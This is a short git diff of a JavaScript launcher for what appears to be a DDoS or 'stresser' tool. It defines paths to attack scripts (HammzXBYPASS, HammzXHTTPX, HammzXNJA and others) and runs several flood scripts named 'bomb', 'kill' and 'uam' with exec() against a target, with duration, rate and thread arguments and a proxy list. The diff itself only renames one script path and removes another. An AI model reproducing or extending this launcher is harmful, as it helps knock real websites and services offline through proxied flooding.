@@ -252,8 +252,7 @@ const reset = path.join(__dirname, `HammzXRESET`);
 const resetv2 = path.join(__dirname, `HammzXRESETV2`);
 const ninja = path.join(__dirname, `HammzXNJA`);
 const httpx = path.join(__dirname, `HammzXHTTPX`);
-const bypass = path.join(__dirname, `HammzXBYPASS`);
-const mix = path.join(__dirname, `HammzXMIX`);
+const bypass = path.join(__dirname, `HammzXBYPAS`);
         exec(`node ${bomb} ${target} ${duration} 32 8 proxy.txt`)
         exec(`node ${kill} ${target} ${duration} 100 10 proxy.txt`)
         exec(`node ${uam} ${target} ${duration} 32 8 proxy.txt`)
